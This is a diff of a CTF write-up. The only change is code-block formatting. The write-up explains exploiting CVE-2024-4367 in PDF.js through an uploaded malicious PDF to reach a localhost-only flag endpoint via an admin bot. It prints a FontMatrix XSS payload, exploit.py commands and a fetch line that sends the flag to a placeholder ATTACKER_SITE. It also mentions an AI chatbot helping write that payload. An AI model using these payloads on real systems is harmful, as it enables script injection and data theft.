@@ -36,6 +36,7 @@ The challenge provides two URLs. The first is a web application with `/home`, `/
 
 I'll start with `bot.js` since there's less code, and that's where we might expect the flag to be on an XSS challenge (admin cookie). There's no flag, though; the bot simply visits a user-provided URL.
 
+{% code overflow="wrap" %}
 ```js
 const page = await context.newPage();
 // Visit URL from user
@@ -51,11 +52,13 @@ console.log(cookies);
 console.log("browser close...");
 await context.close();
 ```
+{% endcode %}
 
 #### app.js
 
 When I opened the main app, I quickly found the flag endpoint.
 
+{% code overflow="wrap" %}
 ```js
 app.get("/flag", (req, res) => {
     let ip = req.connection.remoteAddress;
@@ -66,11 +69,13 @@ app.get("/flag", (req, res) => {
     }
 });
 ```
+{% endcode %}
 
 It's validating the IP to ensure the request originated from the localhost, so it looks like we've got an [SSRF](https://portswigger.net/web-security/ssrf) vulnerability. We can provide the URL to the bot; it will visit the page and get the flag in the response - simple. The question is, how can we retrieve the contents of that response?
 
 An `/upload` endpoint allows users to upload files and then returns the URL of the hosted file.
 
+{% code overflow="wrap" %}
 ```js
 app.post("/upload", upload.single("file"), (req, res) => {
     const fileData = {
@@ -88,9 +93,11 @@ app.post("/upload", upload.single("file"), (req, res) => {
     });
 });
 ```
+{% endcode %}
 
 There's some validation on the file type allowed. - it must be PDF format.
 
+{% code overflow="wrap" %}
 ```js
 const upload = multer({
     storage: storage,
@@ -104,6 +111,7 @@ const upload = multer({
     },
 });
 ```
+{% endcode %}
 
 ### XSS
 
@@ -111,9 +119,11 @@ This makes me think about [Server Side XSS (Dynamic PDF)](https://book.hacktrick
 
 We want to know the type of PDF generator being used in case there are any known vulnerabilities.
 
+{% code overflow="wrap" %}
 ```js
 const PDFJS = require("pdfjs-dist");
 ```
+{% endcode %}
 
 I Googled `pdfjs-dist exploit` and the 5th result stood out to me; [CVE-2024-4367 – Arbitrary JavaScript execution in PDF.js](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)
 
@@ -137,19 +147,23 @@ The blog post is around 6 weeks old, so it's a good candidate! I'd encourage you
 
 They provide a link to a [PDF PoC](https://codeanlabs.com/wp-content/uploads/2024/05/poc_generalized_CVE-2024-4367.pdf), so I downloaded it and uploaded it to the challenge site. It pops an alert! We can review the request in Burp to see the responsible code.
 
+{% code overflow="wrap" %}
 ```js
 << /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R /FontMatrix [ 1 2 3 4 5 (1\); alert\('origin: '+window.origin+', pdf url: '+\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\)) ] /Subtype /Type1 /Type /Font >>
 ```
+{% endcode %}
 
 So, how did I develop my XSS payload? I told ChatGPT I want to `fetch the contents of another page and then send them to another web server` 🤓
 
 It initially provides some ridiculously long payloads, but through our iterative feedback (aka "shorter plz"), we guide it to produce a more reasonable one.
 
+{% code overflow="wrap" %}
 ```js
 fetch("/flag")
     .then((r) => r.text())
     .then((t) => fetch(`https://ATTACKER_SITE/?c=${encodeURIComponent(t)}`));
 ```
+{% endcode %}
 
 I got some errors and figured I wasn't escaping all the required characters, so I Googled `CVE-2024-4367 PoC` and came across another [PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC).
 
@@ -157,23 +171,29 @@ I got some errors and figured I wasn't escaping all the required characters, so 
 
 > If pdf.js is used to load a malicious PDF, and PDF.js is configured with isEvalSupported set to true (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.
 
+{% code overflow="wrap" %}
 ```bash
 python exploit.py "fetch('/flag').then(r => r.text()).then(t => fetch(`https://ATTACKER_SITE/?c=${encodeURIComponent(t)}`));"
 ```
+{% endcode %}
 
 The PDF was generated successfully, but I got an error about `bad substitution.` Turns out I just needed to escape some characters.
 
+{% code overflow="wrap" %}
 ```bash
 python exploit.py "fetch('/flag').then(r => r.text()).then(t => fetch(\`ATTACKER_SITE/?c=\${encodeURIComponent(t)}\`));"
 [+] Created malicious PDF file: poc.pdf
 [+] Open the file with the vulnerable application to trigger the exploit.
 ```
+{% endcode %}
 
 When I upload the PDF and visit the URL, my browser console and web server logs are filled with errors.
 
+{% code overflow="wrap" %}
 ```bash
 200		GET	/?c=%7B%22error%22%3A%22Access%20denied%22%7D
 ```
+{% endcode %}
 
 ### SSRF
 
@@ -183,15 +203,19 @@ _Note:_ Maybe this is technically CSRF since the bot simulates an admin user, an
 
 Regardless, the XSS payload will subsequently issue a request to our server, with the response included in the GET parameter.
 
+{% code overflow="wrap" %}
 ```bash
 200		GET	/?c=%7B%22flag%22%3A%22AKASEC%7BPDF_1s_4w3s0m3_W1th_XSS_%26%26_Fr33_P4le5T1n3%7D%22%7D
 ```
+{% endcode %}
 
 The final step is to URL-decode the flag.
 
+{% code overflow="wrap" %}
 ```bash
 urldecode %7B%22flag%22%3A%22AKASEC%7BPDF_1s_4w3s0m3_W1th_XSS_%26%26_Fr33_P4le5T1n3%7D%22%7D
 {"flag":"AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3}"}
 ```
+{% endcode %}
 
 Flag: `AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3}` 🕊✌
